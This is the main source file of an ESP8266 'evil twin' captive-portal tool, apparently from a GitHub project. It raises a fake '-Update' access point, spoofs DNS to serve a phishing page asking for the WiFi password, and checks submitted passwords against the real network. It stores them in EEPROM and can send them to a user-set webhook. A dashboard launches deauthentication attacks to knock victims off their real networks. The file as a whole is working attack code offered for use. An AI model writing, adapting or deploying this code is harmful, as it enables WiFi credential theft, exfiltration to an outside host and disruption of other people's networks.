////////////////////////////////////////////////////
//              Made By HEINZGUENTER              //
// github.com/heinzguenter/ESP8266-Captive-Portal //
////////////////////////////////////////////////////

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <SoftwareSerial.h>

#include "portal_pages.h"
#include "dashboard.h"
#include "favicon.h"

#define DefaultSSID "Portal-Update" //Default SSID name
String webhookUrl = ""; //put your webhook url here if you dont want to re-enter it on reboot

#define DNS_PORT 53 //Port for the DNS Server
const IPAddress APIP(192, 168, 1, 1); //The ip of the esp8266 itself where you can acces the dashboard and index page

#define passStart 34 //Starting location in EEPROM to save password.
int passEnd = passStart; //Ending location in EEPROM to save password.
String allPass; //Contains all Passwords 

String currentSSID; //Current SSID
String targetSSID; //ssid of the target network
String indexLang = "EN"; //Index Page Language(You can change the Default Language Here)
bool validate = true; //contains if the password should be validated
int slaveStatus = 8; //contains the wifi status of the slave if reported

DNSServer dnsServer; ESP8266WebServer webServer(80);
SoftwareSerial esp(D1, D2);

void redirect(String location){ webServer.sendHeader("Location", location, true); webServer.send(302); } //redirection function to reduce code 

void handleDashboard() { //handles the dashboard page
  int networks = WiFi.scanNetworks(false); int scanstart = millis();
  while (networks <= 1 && millis() - scanstart < 5000){ delay(125); } //ensures that the website only loads if the scan is succesfull or it times out
  
  bool deauthing = false; if(digitalRead(D5) == 0){ deauthing = true; } //if the deauth LED of the slave is on set deauthing to true
  
  webServer.send(200, "text/html", dashboard(indexLang, favicon, targetSSID, allPass, networks, validate, deauthing, webhookUrl));

  if (webServer.hasArg("led_off")){ digitalWrite(LED_BUILTIN, HIGH); redirect("/dashboard"); } //calls the led off function if the button on the dashboard is pressed
}

void handlePost(){
  String pass = webServer.arg("wifiPassword"); //Getting the value of the Password field

  if (validate == true){ //if validation is turned try to connect to the wifi that is beeing validated
    esp.printf("validate|%s|%s", targetSSID.c_str(), pass.c_str()); //give the slave the command to validate the password
    Serial.printf("Connnecting to: %s, %s\n", targetSSID.c_str(), pass.c_str());

    String readString;

    while(!esp.available()){ delay(1); } //wait until the slave reports his wifi status
    while (esp.available()) { //read reported wifi status
      delay(3);
      if (esp.available() > 0) {
        char c = esp.read();
        readString += c;
      }
    }

    String command = readString.substring(0, readString.indexOf('|'));
    if(command == "wifiStatus") { slaveStatus = readString.substring(readString.indexOf('|') + 1).toInt(); }
  }

  if (slaveStatus == 3 || validate == false){ //if conected or validation is turned off start password saving and redirecting to the restarting page
    Serial.printf("Password Correct\n\n");
    redirect("/restarting");

    if(webhookUrl != ""){ //if webhook url is not empty therefore webhook is enabled send the command to send a webhook
      esp.printf("webhook| "); delay(100);
      esp.print(webhookUrl); delay(500);
      esp.print(targetSSID); delay(500);
      esp.print(pass);
    }

    pass = "<tr><td>" + pass + "</td><td>" + millis()/1000 + "</td></tr>"; //Adding password and seconds after bootup in a ordered list.
    allPass += pass; //Updating the full passwords.

    for (int i = 0; i <= pass.length(); ++i){ EEPROM.write(passEnd + i, pass[i]); } //Storing passwords to EEPROM

    passEnd += pass.length(); //Updating end position of passwords in EEPROM.
    EEPROM.write(passEnd, '\0');
    EEPROM.commit();

    digitalWrite(LED_BUILTIN, LOW);

  } else { //if password was not correct redirect to the wrong password page
    Serial.printf("Password Incorrect\n\n");
    
    redirect("/incorrectPass");
  }
}

void handlePostSSID() {
  String postedSSID = webServer.arg("ssid");

  targetSSID = postedSSID;
  postedSSID += "-Update"; //if you want to change this you have to edit the number of chars that are beeing subtracted in the setup where the target ssid is set
  for (int i = 0; i < postedSSID.length(); ++i) { EEPROM.write(i+1, postedSSID[i]); } //write ssid to the EEPROM
  EEPROM.write(postedSSID.length()+1, '\0');
  EEPROM.commit();

  redirect("/dashboard");

  WiFi.softAPdisconnect(true); //disable the ap
  delay(2000);
  WiFi.softAP(postedSSID); //restart ap with the new ssid
  currentSSID = postedSSID;

  Serial.printf("SSID changed to: %s\n\n", currentSSID.c_str());
}

void clearPass(){ //deletes all stored passwords
  allPass = "";
  passEnd = passStart; //Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  Serial.printf("All passwords deleted\n\n");
  redirect("/dashboard");
}

void handleLang(){ //change the language for the pages the user will see
  indexLang = webServer.arg("lang");
  Serial.printf("Language changed to: %s\n\n", indexLang.c_str());
  redirect("/dashboard");
}

void handleDeauth(){ //gets the target and duration for the deauth attack and sends the data to the deauth function
  int target = webServer.arg("target").toInt(); 

  Serial.printf("Starting to Deauth: %s(%s), on channel: %i\n\n", WiFi.SSID(target).c_str(), WiFi.BSSIDstr(target).c_str(), WiFi.channel(target));
  
  esp.printf("deauth|%i|%s", WiFi.channel(target), WiFi.BSSIDstr(target).c_str()); //send the deauth command to the slave

  redirect("/dashboard");
}

void stopDeauth(){
  esp.printf("stopDeauthing"); 
  redirect("/dashboard");

  Serial.printf("Done Deauthing\n\n");
}

void setValidate(){
  redirect("/dashboard");
  
  if (webServer.arg("validate") == "on"){ validate = true; } else { validate = false; }

  Serial.printf("Validate set to %s\n\n", validate ? "true" : "false");
}

void setWebhookUrl(){
  redirect("/dashboard");

  webhookUrl = webServer.arg("url");

  if(webhookUrl != ""){ Serial.printf("Webhook Url set to %s\n\n", webhookUrl.c_str()); } else { Serial.print("Webhook disabled\n"); }
}

void setup(){
  Serial.begin(115200);
  EEPROM.begin(512);
  esp.begin(115200);

  if (EEPROM.read(0) != '\0') {
    EEPROM.write(0, '\0');
    EEPROM.write(1, '\0');
    EEPROM.write(passStart, '\0');
    EEPROM.commit();
  }

  String ESSID;
  int i = 1;
  while (EEPROM.read(i) != '\0') { ESSID += char(EEPROM.read(i)); i++; } //Read EEPROM SSID

  //Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0') {
    allPass += char(EEPROM.read(passEnd)); //Reading the store password in EEPROM.
    passEnd++; //Updating the end location of password in EEPROM.
  }
  
  Serial.printf("\n\nWiFi mode setup: %s\n", WiFi.mode(WIFI_AP) ? "Sucessfully!" : "Failed!");
  Serial.printf("Soft ap config: %s\n", WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0)) ? "Sucessfully!" : "Failed!");

  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : DefaultSSID; //Setting currentSSID -> SSID in EEPROM or default one.
  targetSSID = currentSSID.substring(0, currentSSID.length() - 7);
  
  Serial.printf("Soft ap setup: %s\n", WiFi.softAP(currentSSID) ? "Sucessfully!" : "Failed!");
  Serial.printf("AP SSID: %s\n", currentSSID.c_str());
  Serial.printf("DNS server setup: %s\n\n", dnsServer.start(DNS_PORT, "*", APIP) ? "Sucessfully!" : "Failed!"); //DNS spoofing (Only for HTTP)

  webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
  webServer.on("/post", handlePost);
  webServer.on("/restarting", []() {  webServer.send(200, "text/html", Fixing(indexLang, favicon, targetSSID)); });
  webServer.on("/dashboard", handleDashboard);
  webServer.on("/clearPass", clearPass);
  webServer.on("/language", handleLang);
  webServer.on("/deauth", handleDeauth);
  webServer.on("/stop", stopDeauth);
  webServer.on("/incorrectPass", [](){ webServer.send(200, "text/html", wrongPass(indexLang, favicon, targetSSID)); });
  webServer.on("/ssid", handlePostSSID);
  webServer.on("/validate", setValidate);
  webServer.on("/webhook", setWebhookUrl);
  
  
  webServer.onNotFound([](){  webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
  webServer.begin();

  //Enable the built-in LED
  pinMode(LED_BUILTIN, OUTPUT); digitalWrite(LED_BUILTIN, HIGH); //enable the builtin LED
  pinMode(D5, INPUT);
}

void loop(){
  dnsServer.processNextRequest(); webServer.handleClient(); //process dns and webserver requests

  while (esp.available()) { delay(3); Serial.write(esp.read()); } //print everything the slave send to the serial interface
}